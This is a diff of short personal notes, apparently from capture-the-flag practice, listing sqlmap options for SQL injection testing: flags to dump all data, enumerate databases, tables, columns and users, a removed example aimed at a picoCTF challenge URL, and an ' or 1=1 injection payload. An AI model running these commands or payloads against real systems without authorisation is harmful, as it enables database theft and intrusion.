@@ -1,15 +1,49 @@
 sqlmap (automated sql injection testing):
 copy target request from burp -> run "sqlmap -r <target request> --level 5 --risk 3"
+
 (can also use -l <log-file> on target burp log)
-ex)
-sqlmap \\
--u "http://2018shell.picoctf.com:28120/answer2.php" \\ (target URL)
---method POST \\ (target request method)
---data "answer=TestBestTest&debug=0" \\ (payload to send)
--p "answer" \\ (suspected injectable parameter)
---dbms=SQlite  \\ (SQL db for this request)
---not-string="Wrong." \\ (string in return data indicating a false query)
---dump-all (get all data)
+(target URL)
+-u "<url>"
+
+(target request method)
+--method POST
+
+(payload to send)
+--data "answer=TestBestTest&debug=0"
+
+(suspected injectable parameter)
+-p "answer"
+
+(SQL db for this request)
+--dbms=<dbms-name>
+
+(string in return data indicating a false query)
+--not-string="Wrong."
+
+(get all data)
+--dump-all
+
+(get dbms banner)
+--banner
+
+(get all databases)
+--dbs
+
+(get tables of database)
+--tables -D <database-name>
+
+(get table columns)
+--columns -D <database-name> -T <table-name>
+
+(get number of entries)
+--count -D <database-name> -T <table-name>
+
+(get users)
+--users
+
+(select a technique (https://github.com/sqlmapproject/sqlmap/wiki/Techniques))
+--technique=<technique-name>
+
 
 common queries:
 'or 1=1
